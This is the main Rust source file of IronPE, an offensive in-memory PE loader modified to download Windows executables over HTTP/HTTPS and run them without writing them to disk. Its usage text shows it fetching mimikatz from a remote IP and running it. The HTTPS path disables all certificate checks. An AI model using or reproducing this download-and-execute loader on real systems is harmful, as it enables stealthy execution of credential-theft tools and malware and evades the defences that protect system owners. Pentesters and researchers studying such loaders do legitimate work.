// main.rs
// Original Author: iss4cf0ng/ISSAC
// GitHub: https://github.com/iss4cf0ng/IronPE
// Modified: Added remote URL support (HTTP/HTTPS)

#![allow(non_snake_case)]

mod loader;
mod logger;
mod pe_structures;

use loader::{X64PeLoader, X86PeLoader};
use logger::{log_error, log_info, log_ok, log_warn};
use std::env;
use std::fs;
use std::io::Read;
use std::net::TcpStream;
use std::time::Duration;

use crate::loader::load_x64;
use crate::loader::load_x86;

const BANNER: &str = r#"
  _        (`-')            <-. (`-')_  _  (`-') (`-')  _ 
 (_)    <-.(OO )      .->      \( OO) ) \-.(OO ) ( OO).-/ 
 ,-(`-'),------,)(`-')----. ,--./ ,--/  _.'    \(,------. 
 | ( OO)|   /`. '( OO).-.  '|   \ |  | (_...--'' |  .---' 
 |  |  )|  |_.' |( _) | |  ||  . '|  |)|  |_.' |(|  '--.  
(|  |_/ |  .   .' \|  |)|  ||  |\    | |  .___.' |  .--'  
 |  |'->|  |\  \   '  '-'  '|  | \   | |  |      |  `---. 
 `--'   `--' '--'   `-----' `--'  `--' `--'      `------' 
"#;

const DESCRIPTION: &str = "Author: iss4cf0ng/ISSAC\nGitHub: https://github.com/iss4cf0ng/IronPE";

const USAGE: &str = "Example:
\tIronPE.exe --x86 <FilePath or URL>
\tIronPE.exe --x64 <FilePath or URL>
\tIronPE.exe --x64 http://192.168.100.59:8443/win/mimikatz.exe
\tIronPE.exe --coffee
";

const COFFEE: &str = r#"
    (  )   (   )  )
     ) (   )  (  (
     ( )  (    ) )
     _____________
    <_____________> ___
    |             |/ _ \
    |               | | |
    |               |_| |
 ___|             |\___/
/    \___________/    \
\_____________________/
"#;

const MAX_REDIRECTS: u32 = 5;
const CONNECT_TIMEOUT_SECS: u64 = 15;
const READ_TIMEOUT_SECS: u64 = 60;

fn main() {
    #[cfg(windows)]
    {
        use windows::Win32::System::Console::{
            GetConsoleMode, GetStdHandle, SetConsoleMode,
            ENABLE_VIRTUAL_TERMINAL_PROCESSING, STD_OUTPUT_HANDLE,
        };
        unsafe {
            let handle = GetStdHandle(STD_OUTPUT_HANDLE).unwrap();
            let mut mode = windows::Win32::System::Console::CONSOLE_MODE(0);
            let _ = GetConsoleMode(handle, &mut mode);
            let _ = SetConsoleMode(handle, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
        }
    }

    println!("{}", BANNER);
    println!("{}", DESCRIPTION);

    let arch = if cfg!(target_pointer_width = "64") {
        "x64"
    } else {
        "x86"
    };
    log_info(&format!("The current process architecture is: {}", arch));

    let args: Vec<String> = env::args().collect();

    let valid = args.len() >= 3 || (args.len() == 2 && args[1] == "--coffee");
    if !valid {
        println!("{}", USAGE);
        return;
    }

    if let Err(e) = run(&args) {
        log_error(&e);
    }
}

fn run(args: &[String]) -> Result<(), String> {
    match args[1].as_str() {
        "--coffee" => {
            println!("{}", COFFEE);
            Ok(())
        }

        "--x86" => {
            log_info("Action => x86 loading...");

            if cfg!(target_pointer_width = "64") {
                return Err(
                    "Current process is x64, cannot load an x86 PE from a 64-bit process."
                        .to_string(),
                );
            }

            let target = &args[2];
            let bytes = fetch_bytes(target)?;

            let pe = X86PeLoader::new(bytes)?;
            if !pe.is_32bit() {
                return Err("This is not an x86 (PE32) file.".to_string());
            }

            let image_base = pe.optional_header.image_base;
            log_ok(&format!("Image base = {:#X}", image_base));

            load_x86(&pe)
        }

        "--x64" => {
            log_info("Action => x64 loading...");

            if cfg!(target_pointer_width = "32") {
                return Err(
                    "Current process is x86, cannot load an x64 PE from a 32-bit process."
                        .to_string(),
                );
            }

            let target = &args[2];
            let bytes = fetch_bytes(target)?;

            let pe = X64PeLoader::new(bytes)?;
            if pe.is_32bit_header() {
                return Err("This is not an x64 PE file.".to_string());
            }

            let image_base = pe.optional_header64.image_base;
            log_ok(&format!("Image base = {:#X}", image_base));

            load_x64(&pe)
        }

        other => Err(format!("Unknown command: {}", other)),
    }
}

/// Determines if the target is a URL or local path and fetches bytes accordingly
fn fetch_bytes(target: &str) -> Result<Vec<u8>, String> {
    if is_url(target) {
        log_info(&format!("Detected remote target: {}", target));
        download_remote(target)
    } else {
        log_info(&format!("Detected local target: {}", target));
        read_file(target)
    }
}

/// Check if the target string looks like a URL
fn is_url(target: &str) -> bool {
    let lower = target.to_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://")
}

/// Read a PE file from a local path
fn read_file(path: &str) -> Result<Vec<u8>, String> {
    if !std::path::Path::new(path).exists() {
        return Err(format!("File not found: {}", path));
    }

    let bytes = fs::read(path).map_err(|e| format!("Failed to read file '{}': {}", path, e))?;
    log_ok(&format!(
        "Read local file successfully. Length: {} bytes",
        bytes.len()
    ));

    Ok(bytes)
}

/// Download a PE file from a remote HTTP/HTTPS URL (no external dependencies)
fn download_remote(url: &str) -> Result<Vec<u8>, String> {
    let mut current_url = url.to_string();

    for redirect_count in 0..=MAX_REDIRECTS {
        if redirect_count > 0 {
            log_warn(&format!(
                "Following redirect #{} -> {}",
                redirect_count, current_url
            ));
        }

        let parsed = parse_url(&current_url)?;
        log_info(&format!(
            "Connecting to {}:{} (TLS: {})...",
            parsed.host, parsed.port, parsed.use_tls
        ));

        let body_result = if parsed.use_tls {
            http_get_tls(&parsed)?
        } else {
            http_get_plain(&parsed)?
        };

        match body_result {
            HttpResponse::Success(bytes) => {
                log_ok(&format!(
                    "Downloaded successfully. Length: {} bytes",
                    bytes.len()
                ));
                if bytes.len() < 2 {
                    return Err("Downloaded file is too small to be a valid PE.".to_string());
                }
                if bytes[0] != 0x4D || bytes[1] != 0x5A {
                    log_warn("Warning: Downloaded file does not start with MZ header.");
                }
                return Ok(bytes);
            }
            HttpResponse::Redirect(location) => {
                // Resolve relative redirects
                if location.starts_with("http://") || location.starts_with("https://") {
                    current_url = location;
                } else if location.starts_with('/') {
                    let scheme = if parsed.use_tls { "https" } else { "http" };
                    let port_str = if (parsed.use_tls && parsed.port == 443)
                        || (!parsed.use_tls && parsed.port == 80)
                    {
                        String::new()
                    } else {
                        format!(":{}", parsed.port)
                    };
                    current_url = format!("{}://{}{}{}", scheme, parsed.host, port_str, location);
                } else {
                    return Err(format!("Unsupported redirect location: {}", location));
                }
            }
            HttpResponse::Error(status, msg) => {
                return Err(format!(
                    "HTTP request failed with status {}: {}",
                    status, msg
                ));
            }
        }
    }

    Err(format!(
        "Too many redirects (max {}). Aborting.",
        MAX_REDIRECTS
    ))
}

// ---------------------------------------------------------------------------
// Minimal HTTP implementation (zero external dependencies)
// ---------------------------------------------------------------------------

struct ParsedUrl {
    host: String,
    port: u16,
    path: String,
    use_tls: bool,
}

enum HttpResponse {
    Success(Vec<u8>),
    Redirect(String),
    Error(u16, String),
}

fn parse_url(url: &str) -> Result<ParsedUrl, String> {
    let (use_tls, rest) = if let Some(r) = url.strip_prefix("https://") {
        (true, r)
    } else if let Some(r) = url.strip_prefix("http://") {
        (false, r)
    } else {
        return Err(format!("Unsupported URL scheme: {}", url));
    };

    let (host_port, path) = match rest.find('/') {
        Some(idx) => (&rest[..idx], &rest[idx..]),
        None => (rest, "/"),
    };

    let (host, port) = if let Some(bracket_end) = host_port.find(']') {
        // IPv6: [::1]:port
        let h = &host_port[..=bracket_end];
        if bracket_end + 1 < host_port.len() && host_port.as_bytes()[bracket_end + 1] == b':' {
            let p = host_port[bracket_end + 2..]
                .parse::<u16>()
                .map_err(|_| format!("Invalid port in URL: {}", url))?;
            (h.to_string(), p)
        } else {
            (h.to_string(), if use_tls { 443 } else { 80 })
        }
    } else if let Some(colon_idx) = host_port.rfind(':') {
        let h = &host_port[..colon_idx];
        let p = host_port[colon_idx + 1..]
            .parse::<u16>()
            .map_err(|_| format!("Invalid port in URL: {}", url))?;
        (h.to_string(), p)
    } else {
        (host_port.to_string(), if use_tls { 443 } else { 80 })
    };

    Ok(ParsedUrl {
        host,
        port,
        path: path.to_string(),
        use_tls,
    })
}

fn build_http_request(parsed: &ParsedUrl) -> Vec<u8> {
    let host_header = if (parsed.use_tls && parsed.port == 443)
        || (!parsed.use_tls && parsed.port == 80)
    {
        parsed.host.clone()
    } else {
        format!("{}:{}", parsed.host, parsed.port)
    };

    let request = format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) IronPE/1.0\r\n\
         Accept: */*\r\n\
         Connection: close\r\n\
         \r\n",
        parsed.path, host_header
    );

    request.into_bytes()
}

fn http_get_plain(parsed: &ParsedUrl) -> Result<HttpResponse, String> {
    let addr = format!("{}:{}", parsed.host, parsed.port);
    let mut stream = TcpStream::connect_timeout(
        &addr
            .parse()
            .map_err(|e| format!("Invalid address '{}': {}", addr, e))?,
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
    )
    .map_err(|e| format!("Failed to connect to {}: {}", addr, e))?;

    stream
        .set_read_timeout(Some(Duration::from_secs(READ_TIMEOUT_SECS)))
        .ok();

    let request = build_http_request(parsed);
    std::io::Write::write_all(&mut stream, &request)
        .map_err(|e| format!("Failed to send HTTP request: {}", e))?;

    read_http_response(&mut stream)
}

/// HTTPS download using the Windows SChannel API via native-tls (schannel backend on Windows)
/// Falls back to a compile-time cfg: if the `tls` feature is not enabled, returns an error.
/// 
/// For a zero-dependency approach on Windows, we use the winapi schannel directly.
/// However, the simplest cross-compile-friendly approach is to use native-tls which
/// uses schannel on Windows automatically and adds no OpenSSL dependency.
/// 
/// If you want ZERO crate dependencies, replace this with raw WinHTTP calls below.
fn http_get_tls(parsed: &ParsedUrl) -> Result<HttpResponse, String> {
    // Attempt native Windows HTTPS via WinHTTP (zero external crate dependencies)
    #[cfg(windows)]
    {
        return winhttp_download(parsed);
    }

    #[cfg(not(windows))]
    {
        return Err("HTTPS is only supported on Windows targets via WinHTTP.".to_string());
    }
}

/// WinHTTP-based HTTPS download — zero external crates, uses Windows API directly
#[cfg(windows)]
fn winhttp_download(parsed: &ParsedUrl) -> Result<HttpResponse, String> {
    use std::ptr;

    // WinHTTP constants
    const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
    const WINHTTP_NO_PROXY_NAME: *const u16 = ptr::null();
    const WINHTTP_NO_PROXY_BYPASS: *const u16 = ptr::null();
    const WINHTTP_NO_REFERER: *const u16 = ptr::null();
    const WINHTTP_DEFAULT_ACCEPT_TYPES: *const *const u16 = ptr::null();
    const WINHTTP_NO_ADDITIONAL_HEADERS: *const u16 = ptr::null();
    const WINHTTP_NO_REQUEST_DATA: *const u8 = ptr::null();
    const WINHTTP_FLAG_SECURE: u32 = 0x00800000;

    #[link(name = "winhttp")]
    extern "system" {
        fn WinHttpOpen(
            pszAgentW: *const u16,
            dwAccessType: u32,
            pszProxyW: *const u16,
            pszProxyBypassW: *const u16,
            dwFlags: u32,
        ) -> *mut std::ffi::c_void;

        fn WinHttpConnect(
            hSession: *mut std::ffi::c_void,
            pswzServerName: *const u16,
            nServerPort: u16,
            dwReserved: u32,
        ) -> *mut std::ffi::c_void;

        fn WinHttpOpenRequest(
            hConnect: *mut std::ffi::c_void,
            pwszVerb: *const u16,
            pwszObjectName: *const u16,
            pwszVersion: *const u16,
            pwszReferrer: *const u16,
            ppwszAcceptTypes: *const *const u16,
            dwFlags: u32,
        ) -> *mut std::ffi::c_void;

        fn WinHttpSendRequest(
            hRequest: *mut std::ffi::c_void,
            lpszHeaders: *const u16,
            dwHeadersLength: u32,
            lpOptional: *const u8,
            dwOptionalLength: u32,
            dwTotalLength: u32,
            dwContext: usize,
        ) -> i32;

        fn WinHttpReceiveResponse(
            hRequest: *mut std::ffi::c_void,
            lpReserved: *mut std::ffi::c_void,
        ) -> i32;

        fn WinHttpQueryHeaders(
            hRequest: *mut std::ffi::c_void,
            dwInfoLevel: u32,
            pwszName: *const u16,
            lpBuffer: *mut u8,
            lpdwBufferLength: *mut u32,
            lpdwIndex: *mut u32,
        ) -> i32;

        fn WinHttpReadData(
            hRequest: *mut std::ffi::c_void,
            lpBuffer: *mut u8,
            dwNumberOfBytesToRead: u32,
            lpdwNumberOfBytesRead: *mut u32,
        ) -> i32;

        fn WinHttpCloseHandle(hInternet: *mut std::ffi::c_void) -> i32;

        fn WinHttpSetOption(
            hInternet: *mut std::ffi::c_void,
            dwOption: u32,
            lpBuffer: *const u8,
            dwBufferLength: u32,
        ) -> i32;
    }

    const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
    const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;
    const WINHTTP_QUERY_RAW_HEADERS_CRLF: u32 = 22;
    const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
    const SECURITY_FLAG_IGNORE_ALL: u32 = 0x00003300;

    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    // RAII guard for WinHTTP handles
    struct WinHttpHandle(*mut std::ffi::c_void);
    impl Drop for WinHttpHandle {
        fn drop(&mut self) {
            if !self.0.is_null() {
                unsafe { WinHttpCloseHandle(self.0); }
            }
        }
    }

    unsafe {
        let agent = to_wide("IronPE/1.0");
        let h_session = WinHttpOpen(
            agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0,
        );
        if h_session.is_null() {
            return Err("WinHttpOpen failed.".to_string());
        }
        let _session_guard = WinHttpHandle(h_session);

        let server = to_wide(&parsed.host);
        let h_connect = WinHttpConnect(h_session, server.as_ptr(), parsed.port, 0);
        if h_connect.is_null() {
            return Err("WinHttpConnect failed.".to_string());
        }
        let _connect_guard = WinHttpHandle(h_connect);

        let verb = to_wide("GET");
        let path = to_wide(&parsed.path);
        let flags = if parsed.use_tls { WINHTTP_FLAG_SECURE } else { 0 };

        let h_request = WinHttpOpenRequest(
            h_connect,
            verb.as_ptr(),
            path.as_ptr(),
            ptr::null(),
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags,
        );
        if h_request.is_null() {
            return Err("WinHttpOpenRequest failed.".to_string());
        }
        let _request_guard = WinHttpHandle(h_request);

        // Ignore certificate errors (self-signed certs common in pentesting)
        if parsed.use_tls {
            let security_flags: u32 = SECURITY_FLAG_IGNORE_ALL;
            WinHttpSetOption(
                h_request,
                WINHTTP_OPTION_SECURITY_FLAGS,
                &security_flags as *const u32 as *const u8,
                std::mem::size_of::<u32>() as u32,
            );
        }

        let send_ok = WinHttpSendRequest(
            h_request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0,
        );
        if send_ok == 0 {
            return Err("WinHttpSendRequest failed.".to_string());
        }

        let recv_ok = WinHttpReceiveResponse(h_request, ptr::null_mut());
        if recv_ok == 0 {
            return Err("WinHttpReceiveResponse failed.".to_string());
        }

        // Query status code
        let mut status_code: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        let mut index: u32 = 0;
        WinHttpQueryHeaders(
            h_request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            ptr::null(),
            &mut status_code as *mut u32 as *mut u8,
            &mut size,
            &mut index,
        );

        log_info(&format!("HTTP Status: {}", status_code));

        // Handle redirects (3xx)
        if (300..400).contains(&status_code) {
            // Read Location header
            let mut header_size: u32 = 0;
            let mut idx: u32 = 0;
            let location_header = to_wide("Location");
            // First call to get size
            WinHttpQueryHeaders(
                h_request,
                46, // WINHTTP_QUERY_LOCATION
                location_header.as_ptr(),
                ptr::null_mut(),
                &mut header_size,
                &mut idx,
            );

            if header_size > 0 {
                let mut buffer: Vec<u8> = vec![0u8; header_size as usize];
                idx = 0;
                WinHttpQueryHeaders(
                    h_request,
                    46,
                    location_header.as_ptr(),
                    buffer.as_mut_ptr(),
                    &mut header_size,
                    &mut idx,
                );
                let wide_slice = std::slice::from_raw_parts(
                    buffer.as_ptr() as *const u16,
                    header_size as usize / 2,
                );
                let location = String::from_utf16_lossy(wide_slice);
                return Ok(HttpResponse::Redirect(location));
            }
            return Err(format!("HTTP {} redirect but no Location header.", status_code));
        }

        if status_code < 200 || status_code >= 300 {
            return Ok(HttpResponse::Error(
                status_code as u16,
                format!("Server returned HTTP {}", status_code),
            ));
        }

        // Read body
        let mut body: Vec<u8> = Vec::new();
        let mut chunk = [0u8; 8192];
        loop {
            let mut bytes_read: u32 = 0;
            let ok = WinHttpReadData(
                h_request,
                chunk.as_mut_ptr(),
                chunk.len() as u32,
                &mut bytes_read,
            );
            if ok == 0 || bytes_read == 0 {
                break;
            }
            body.extend_from_slice(&chunk[..bytes_read as usize]);
        }

        Ok(HttpResponse::Success(body))
    }
}

fn read_http_response<R: Read>(reader: &mut R) -> Result<HttpResponse, String> {
    let mut all_data: Vec<u8> = Vec::new();
    let mut buf = [0u8; 8192];

    loop {
        match reader.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => all_data.extend_from_slice(&buf[..n]),
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
            Err(ref e) if e.kind() == std::io::ErrorKind::TimedOut => break,
            Err(e) => return Err(format!("Error reading HTTP response: {}", e)),
        }
    }

    // Find header/body separator
    let header_end = find_header_end(&all_data)
        .ok_or_else(|| "Invalid HTTP response: no header/body separator found.".to_string())?;

    let header_bytes = &all_data[..header_end];
    let body = all_data[header_end + 4..].to_vec(); // skip \r\n\r\n

    let header_str = String::from_utf8_lossy(header_bytes);
    let status_code = parse_status_code(&header_str)?;

    log_info(&format!("HTTP Status: {}", status_code));

    // Handle redirects
    if (300..400).contains(&status_code) {
        if let Some(location) = extract_header(&header_str, "Location") {
            return Ok(HttpResponse::Redirect(location));
        }
        return Err(format!(
            "HTTP {} redirect but no Location header found.",
            status_code
        ));
    }

    if status_code < 200 || status_code >= 300 {
        return Ok(HttpResponse::Error(
            status_code,
            format!("Server returned HTTP {}", status_code),
        ));
    }

    // Handle chunked transfer encoding
    if let Some(te) = extract_header(&header_str, "Transfer-Encoding") {
        if te.to_lowercase().contains("chunked") {
            let decoded = decode_chunked(&body)?;
            return Ok(HttpResponse::Success(decoded));
        }
    }

    Ok(HttpResponse::Success(body))
}

fn find_header_end(data: &[u8]) -> Option<usize> {
    data.windows(4)
        .position(|w| w == b"\r\n\r\n")
}

fn parse_status_code(header: &str) -> Result<u16, String> {
    // HTTP/1.1 200 OK
    let first_line = header.lines().next().unwrap_or("");
    let parts: Vec<&str> = first_line.splitn(3, ' ').collect();
    if parts.len() < 2 {
        return Err(format!("Malformed HTTP status line: {}", first_line));
    }
    parts[1]
        .parse::<u16>()
        .map_err(|_| format!("Invalid HTTP status code: {}", parts[1]))
}

fn extract_header(headers: &str, name: &str) -> Option<String> {
    let search = format!("{}:", name);
    for line in headers.lines() {
        if line.len() > search.len()
            && line[..search.len()].eq_ignore_ascii_case(&search)
        {
            return Some(line[search.len()..].trim().to_string());
        }
    }
    None
}

fn decode_chunked(data: &[u8]) -> Result<Vec<u8>, String> {
    let mut result = Vec::new();
    let mut pos = 0;

    loop {
        // Find chunk size line
        let line_end = match data[pos..].windows(2).position(|w| w == b"\r\n") {
            Some(p) => pos + p,
            None => break,
        };

        let size_str = String::from_utf8_lossy(&data[pos..line_end]);
        let size_str = size_str.trim();

        // Handle chunk extensions (e.g., "a;ext=val")
        let size_hex = size_str.split(';').next().unwrap_or("").trim();

        let chunk_size = usize::from_str_radix(size_hex, 16)
            .map_err(|_| format!("Invalid chunk size: '{}'", size_hex))?;

        if chunk_size == 0 {
            break;
        }

        let chunk_start = line_end + 2;
        let chunk_end = chunk_start + chunk_size;

        if chunk_end > data.len() {
            // Partial chunk — take what we have
            result.extend_from_slice(&data[chunk_start..]);
            break;
        }

        result.extend_from_slice(&data[chunk_start..chunk_end]);
        pos = chunk_end + 2; // skip trailing \r\n
    }

    Ok(result)
}

